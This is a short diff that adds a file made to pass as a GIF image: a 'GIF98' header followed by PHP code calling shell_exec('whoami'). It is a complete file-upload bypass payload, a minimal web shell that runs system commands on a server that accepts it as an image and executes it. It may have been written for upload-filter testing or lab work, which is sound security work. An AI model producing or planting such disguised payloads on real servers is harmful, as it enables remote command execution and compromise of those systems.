@@ -1,0 +1,7 @@
+GIF98
+ 
+
+<?php
+echo shell_exec('whoami');
+?>
+
